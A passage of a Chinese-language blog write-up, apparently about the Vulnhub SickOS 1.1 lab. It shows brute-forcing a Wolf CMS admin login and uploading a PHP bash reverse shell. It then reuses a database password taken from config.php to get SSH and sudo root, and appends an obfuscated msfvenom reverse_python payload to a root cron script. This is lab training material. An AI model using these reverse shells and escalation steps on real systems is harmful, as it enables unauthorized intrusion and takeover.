class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003eB  - /wolfcms/robots.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现\u003ccode\u003erobots.txt\u003c/code\u003e以及\u003ccode\u003ereadme.md\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e访问后\u003ccode\u003erobots.txt\u003c/code\u003e 是空的，\u003ccode\u003ereadme.md\u003c/code\u003e 为配置说明\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过查阅得知后台登陆地址在\u003ccode\u003e/wolfcms/?/admin/login\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubSickOS%201%201/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e网路搜索默认账号密码尝试，登陆失败\u003c/p\u003e\n\u003cp\u003e使用burp进行爆破，指定账号为\u003ccode\u003eadmin\u003c/code\u003e ，通过密码字典爆破\u003c/p\u003e\n\u003cp\u003e爆破成功，账号密码都是 \u003ccode\u003eadmin\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003e获得初级shell\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e登陆进去后寻找可利用点，找到 \u003ccode\u003euploadfile\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003efile\u003c/code\u003e→\u003ccode\u003eUploadfile\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e上传反弹shell代码文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e\u003cspan class=\"hljs-comment\"\u003e//getshell.php\u003c/span\u003e\n\u003cspan class=\"hljs-meta\"\u003e\u0026#x3C;?php\u003c/span\u003e \u003cspan class=\"hljs-title function_ invoke__\"\u003eexec\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"/bin/bash -c 'bash -i \u003e\u0026#x26; /dev/tcp/192.168.75.131/1234 0\u003e\u0026#x26;1'\"\u003c/span\u003e);\u003cspan class=\"hljs-meta\"\u003e?\u003e\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e上传后点击文件，回显文件保存在 \u003ccode\u003e/public/getshell.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubSickOS%201%201/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e一步一步尝试发现文件在 \u003ccode\u003ehttp://192.168.75.136/wolfcms/public/getshell.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ekali\u003c/code\u003e 开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enc -lvp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e                                                     \nlistening on [any] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问 \u003ccode\u003ehttp://192.168.75.136/wolfcms/public/getshell.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e反弹shell成功\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看其权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003elistening on [any] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.136\u003c/span\u003e: inverse host lookup failed: Unknown host\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.131\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e (UNKNOWN) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.136\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e52339\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nwww-data@SickOs:/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/www/wolfcms/\u003cspan class=\"hljs-keyword\"\u003epublic\u003c/span\u003e$ dpkg -l\n...\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nwww-data@SickOs:/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/www/wolfcms/\u003cspan class=\"hljs-keyword\"\u003epublic\u003c/span\u003e$ sudo -l\nsudo: no tty present \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e no askpass program specified\nSorry, \u003cspan class=\"hljs-keyword\"\u003etry\u003c/span\u003e again.\nsudo: no tty present \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e no askpass program specified\nSorry, \u003cspan class=\"hljs-keyword\"\u003etry\u003c/span\u003e again.\nsudo: no tty present \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e no askpass program specified\nSorry, \u003cspan class=\"hljs-keyword\"\u003etry\u003c/span\u003e again.\nsudo: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e incorrect password attempts\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nwww-data@SickOs:/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/www/wolfcms/\u003cspan class=\"hljs-keyword\"\u003epublic\u003c/span\u003e$ uname -a\nLinux SickOs \u003cspan class=\"hljs-number\"\u003e3.11\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e-generic \u003cspan class=\"hljs-comment\"\u003e#25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e权限不高，系统名是\u003ccode\u003eSickOs\u003c/code\u003e 内核版本是\u003ccode\u003e3.11.0-15\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e因为wolf是cms，肯定会存在与数据库连接的文件，找到\u003ccode\u003econfig.php\u003c/code\u003e 文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ecat /\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/www/wolfcms/config.php\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\n\u003cspan class=\"hljs-meta\"\u003e\u0026#x3C;?php\u003c/span\u003e \n\n\u003cspan class=\"hljs-comment\"\u003e// Database information:\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// The path can only be absolute path or :memory:\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// For more info look at: www.php.net/pdo\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e// Database settings:\u003c/span\u003e\n\u003cspan class=\"hljs-title function_ invoke__\"\u003edefine\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'DB_DSN'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'mysql:dbname=wolf;host=localhost;port=3306'\u003c/span\u003e);\n\u003cspan class=\"hljs-title function_ invoke__\"\u003edefine\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'DB_USER'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'root'\u003c/span\u003e);\n\u003cspan class=\"hljs-title function_ invoke__\"\u003edefine\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'DB_PASS'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'john@123'\u003c/span\u003e);\n\u003cspan class=\"hljs-title function_ invoke__\"\u003edefine\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'TABLE_PREFIX'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e);\n.....\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现数据库用户名为\u003ccode\u003eroot\u003c/code\u003e，密码为\u003ccode\u003ejohn@123\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e改密码有可能也是系统上某个用户的密码\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看\u003ccode\u003e/etc/passwd\u003c/code\u003e  寻找可疑用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003eroot:x:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:root:/root:/bin/bash\ndaemon:x:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e:daemon:/usr/sbin:/bin/sh\nbin:x:\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e:bin:/bin:/bin/sh\nsys:x:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e:sys:/dev:/bin/sh\nsync:x:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e65534\u003c/span\u003e:sync:/bin:/bin/sync\ngames:x:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e:games:/usr/games:/bin/sh\nman:x:\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:man:/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/cache/man:/bin/sh\nlp:x:\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e:lp:/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/spool/lpd:/bin/sh\nmail:x:\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e:mail:/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/mail:/bin/sh\nnews:x:\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e:news:/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/spool/news:/bin/sh\nuucp:x:\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:uucp:/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/spool/uucp:/bin/sh\nproxy:x:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:proxy:/bin:/bin/sh\nwww-data:x:\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e:www-data:/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/www:/bin/sh\nbackup:x:\u003cspan class=\"hljs-number\"\u003e34\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e34\u003c/span\u003e:backup:/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/backups:/bin/sh\n\u003cspan class=\"hljs-keyword\"\u003elist\u003c/span\u003e:x:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e:Mailing List Manager:/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/\u003cspan class=\"hljs-keyword\"\u003elist\u003c/span\u003e:/bin/sh\nirc:x:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e:ircd:/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/run/ircd:/bin/sh\ngnats:x:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e:Gnats Bug-Reporting \u003cspan class=\"hljs-title function_ invoke__\"\u003eSystem\u003c/span\u003e (admin):/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/lib/gnats:/bin/sh\nnobody:x:\u003cspan class=\"hljs-number\"\u003e65534\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e65534\u003c/span\u003e:nobody:/nonexistent:/bin/sh\nlibuuid:x:\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e101\u003c/span\u003e::/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/lib/libuuid:/bin/sh\nsyslog:x:\u003cspan class=\"hljs-number\"\u003e101\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e103\u003c/span\u003e::/home/syslog:/bin/\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\nmessagebus:x:\u003cspan class=\"hljs-number\"\u003e102\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e105\u003c/span\u003e::/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/run/dbus:/bin/\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\nwhoopsie:x:\u003cspan class=\"hljs-number\"\u003e103\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e106\u003c/span\u003e::/nonexistent:/bin/\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\nlandscape:x:\u003cspan class=\"hljs-number\"\u003e104\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e109\u003c/span\u003e::/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/lib/landscape:/bin/\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\nsshd:x:\u003cspan class=\"hljs-number\"\u003e105\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e65534\u003c/span\u003e::/\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/run/sshd:/usr/sbin/nologin\nsickos:x:\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e:sickos,,,:/home/sickos:/bin/bash\nmysql:x:\u003cspan class=\"hljs-number\"\u003e106\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e114\u003c/span\u003e:MySQL Server,,,:/nonexistent:/bin/\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现可疑用户有 \u003ccode\u003eroot\u003c/code\u003e，\u003ccode\u003ewww-data\u003c/code\u003e，\u003ccode\u003ebckup\u003c/code\u003e，\u003ccode\u003esickos\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用可疑用户进行ssh登录，密码使用\u003ccode\u003ejohn@123\u003c/code\u003e ，数据库链接上的密码\u003c/p\u003e\n\u003cp\u003e最后\u003ccode\u003esickos\u003c/code\u003e 成功登录\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看\u003ccode\u003esickos\u003c/code\u003e 用户权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003esickos@SickOs:~$ sudo -l\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\n[sudo] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e sickos: \nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e sickos on this host:\n    env_reset, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser sickos may run the following commands on this host:\n    (ALL : ALL) ALL\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e等于root权限\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e读取flag\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003esickos@SickOs:~$ sudo /bin/bash\nroot@SickOs:~\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nroot@SickOs:/home\u003cspan class=\"hljs-comment\"\u003e# cd /root\u003c/span\u003e\nroot@SickOs:/root\u003cspan class=\"hljs-comment\"\u003e# cat a0216ea4d51874464078c618298b1367.txt \u003c/span\u003e\nIf you are viewing this!!\n\nROOT!\n\nYou have Succesfully completed SickOS1.\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e.\nThanks \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Trying\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003e另外一种提权思路\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看定时任务\u003ccode\u003ecrontab\u003c/code\u003e ，在\u003ccode\u003e/etc/cron.d/\u003c/code\u003e 里面存在一个\u003ccode\u003eautomate\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e内容是\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ewww-data@SickOs:/etc/cron.d$ cat automate\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\n* * * * * root /usr/bin/python /\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/www/connect.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e每分钟使用\u003ccode\u003eroot\u003c/code\u003e执行\u003ccode\u003econnect.py\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e可以往\u003ccode\u003econnect.py\u003c/code\u003e 添加反弹\u003ccode\u003eshell\u003c/code\u003e代码\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e生成\u003ccode\u003epy\u003c/code\u003e的\u003ccode\u003epayload\u003c/code\u003e代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003emsfvenom -p cmd/unix/reverse_python lhost=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.131\u003c/span\u003e lport=\u003cspan class=\"hljs-number\"\u003e1235\u003c/span\u003e -f raw\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\n[-] No platform was selected, choosing \u003cspan class=\"hljs-title class_\"\u003eMsf\u003c/span\u003e::\u003cspan class=\"hljs-variable constant_\"\u003eModule\u003c/span\u003e::\u003cspan class=\"hljs-variable constant_\"\u003ePlatform\u003c/span\u003e::\u003cspan class=\"hljs-variable constant_\"\u003eUnix\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e the payload\n[-] No arch selected, selecting arch: cmd \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e the payload\nNo encoder specified, outputting raw payload\nPayload size: \u003cspan class=\"hljs-number\"\u003e364\u003c/span\u003e bytes\npython -c \u003cspan class=\"hljs-string\"\u003e\"exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqFkM0KwjAQhF8l5JSARJNSf5AcilQQUcH2XmyMtFib0E3fX0Paeuxehtn9dge2/ljTOQRGvbVDCC0Qgr60nVEaIHjz0z3yVRlwEvOdYHy9ZZuY8YjjcejvSC6ieGyADFdZEDK45Ficrmk+ZIVedjuciyy/p8mFTutMmbbVyhHicwPvQ+iEGGDP3goC7FU3ujWEBmo1S/BZQkyElf+PMPVoGoKXZd0uocL0C7l5Vrk=')[0])))\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e因为crontab执行的是python文件，所以不用exec再套一遍python，所以到的就有\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e\u003cspan class=\"hljs-title function_ invoke__\"\u003eexec\u003c/span\u003e(\u003cspan class=\"hljs-title function_ invoke__\"\u003e__import__\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'zlib'\u003c/span\u003e).\u003cspan class=\"hljs-title function_ invoke__\"\u003edecompress\u003c/span\u003e(\u003cspan class=\"hljs-title function_ invoke__\"\u003e__import__\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'base64'\u003c/span\u003e).\u003cspan class=\"hljs-title function_ invoke__\"\u003eb64decode\u003c/span\u003e(\u003cspan class=\"hljs-title function_ invoke__\"\u003e__import__\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'codecs'\u003c/span\u003e).\u003cspan class=\"hljs-title function_ invoke__\"\u003egetencoder\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e)(\u003cspan class=\"hljs-string\"\u003e'eNqFkM0KwjAQhF8l5JSARJNSf5AcilQQUcH2XmyMtFib0E3fX0Paeuxehtn9dge2/ljTOQRGvbVDCC0Qgr60nVEaIHjz0z3yVRlwEvOdYHy9ZZuY8YjjcejvSC6ieGyADFdZEDK45Ficrmk+ZIVedjuciyy/p8mFTutMmbbVyhHicwPvQ+iEGGDP3goC7FU3ujWEBmo1S/BZQkyElf+PMPVoGoKXZd0uocL0C7l5Vrk='\u003c/span\u003e)[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e])))\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e把payload重定向到\u003ccode\u003econnect.py\u003c/code\u003e (\u003ccode\u003econnect.py\u003c/code\u003e 其实就是渗透阶段发现的\u003ccode\u003e/connect\u003c/code\u003e 目录里的内容)\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e\u003cspan class=\"hljs-keyword\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqFkM0KwjAQhF8l5JSARJNSf5AcilQQUcH2XmyMtFib0E3fX0Paeuxehtn9dge2/ljTOQRGvbVDCC0Qgr60nVEaIHjz0z3yVRlwEvOdYHy9ZZuY8YjjcejvSC6ieGyADFdZEDK45Ficrmk+ZIVedjuciyy/p8mFTutMmbbVyhHicwPvQ+iEGGDP3goC7FU3ujWEBmo1S/BZQkyElf+PMPVoGoKXZd0uocL0C7l5Vrk=')[0])))\"\u003c/span\u003e \u003e\u003e /\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e/www/connect.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ekali开启监听，等待代码执行\u003c/p\u003e\n\u003cp\u003e获得\u003ccode\u003eroot\u003c/code\u003e权限成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enc -lvp \u003cspan class=\"hljs-number\"\u003e1235\u003c/span\u003e                                    \nlistening on [any] \u003cspan class=\"hljs-number\"\u003e1235\u003c/span\u003e ...\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.136\u003c/span\u003e: inverse host lookup failed: Unknown host\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.131\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e (UNKNOWN) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.136\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e51066\u003c/span\u003e\n\npython -c \u003cspan class=\"hljs-string\"\u003e\"import pty;pty.spawn('/bin/bash')\"\u003c/span\u003e\nroot@SickOs:~\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","title":"Vulnhub - SickOS 1 1","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"SickOS 1.1 主机发现端口扫描 1. 探测存活主机，136是靶机，因为靶机是我最后添加的 2. 扫描靶机所有开放端口 3. 查看服务版本以及系统版本 4. 使用脚本扫描漏洞 web渗透 只有8080是关闭的，打开的只有3128 端口运行着squid代理服务和ssh，访问3128 ，返回 可知..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"VulnhubSickOS 1 1"},"buildId":"rBOAoH_mNY0kmuqb3_RcF","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>